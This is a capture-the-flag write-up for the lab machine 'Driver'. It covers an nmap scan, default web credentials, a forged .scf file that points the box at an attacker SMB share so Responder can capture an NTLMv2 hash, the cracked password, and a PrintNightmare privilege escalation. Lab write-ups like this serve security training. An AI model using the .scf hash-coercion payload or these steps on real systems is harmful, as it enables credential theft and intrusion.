\chapter{Overview}

Driver is an easy Windows Box with the IP address of \texttt{10.10.11.106}.

\chapter{Recon}

\section{nmap}
\begin{wulisting}
    # Nmap 7.92 scan initiated Sat Oct 23 20:54:39 2021 as: nmap -sS -p- -vv -oA nmap/all-ports 10.10.11.106
    Nmap scan report for 10.10.11.106
    Host is up, received echo-reply ttl 127 (0.029s latency).
    Scanned at 2021-10-23 20:54:39 CEST for 105s
    Not shown: 65531 filtered tcp ports (no-response)
    PORT     STATE SERVICE      REASON
    80/tcp   open  http         syn-ack ttl 127
    135/tcp  open  msrpc        syn-ack ttl 127
    445/tcp  open  microsoft-ds syn-ack ttl 127
    5985/tcp open  wsman        syn-ack ttl 127

    Read data files from: /usr/bin/../share/nmap
    # Nmap done at Sat Oct 23 20:56:24 2021 -- 1 IP address (1 host up) scanned in 105.24 seconds
\end{wulisting}

\section{webserver}
Default creds are \texttt{admin:admin}. Webserver has upload form to upload printer firmware.

You can upload a forged \texttt{scf} file to make the box respond to you and catch the NetNTLMv2 Hash of \textbf{tony} with \texttt{Responder.py}.

The file is supposed to look like this:

\begin{wulisting}
‚ùØ cat @driver.scf
[Shell]
Command=2
IconFile=\\10.10.14.19\share\test.ico
[Taskbar]
Command=ToggleDesktop
\end{wulisting}

And Responder will go like brrrrr:

\begin{wulisting}
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:ae42492a2338d28f:66F054A16E8DC3F4739580B5BAC10218:0101000000000000004447D453C8D701180330F0C8764AF70000000002000800370032004D00310001001E00570049004E002D004B00370059004A004D004D005900560055005700480004003400570049004E002D004B00370059004A004D004D00590056005500570048002E00370032004D0031002E004C004F00430041004C0003001400370032004D0031002E004C004F00430041004C0005001400370032004D0031002E004C004F00430041004C0007000800004447D453C8D701060004000200000008003000300000000000000000000000002000009F27369ECC840365148D3814712B676D315D32ABCB844052522BCE9ADEA9E5B30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003900000000000000000000000000
\end{wulisting}

Cracking that with \texttt{john} and \texttt{rockyou} will give you the password \textbf{liltony}.

As there is winrm listening we will continue with \texttt{evil-winrm}.

\chapter{Foothold}

Now we are in as tony and grab the \texttt{user.txt} file at his desktop.

\chapter{Privilege Escalation}

This machine is vulnerable to \texttt{PrintNightmare}. I used the \texttt{.ps1}-Version like depictured to gain admin privileges:

\wuimage[]{files/nightmare.png}{Using Print Nightmare to add admin account}
\wuimage[]{files/beroot.png}{Logged in as adm1n grabbing the flag}
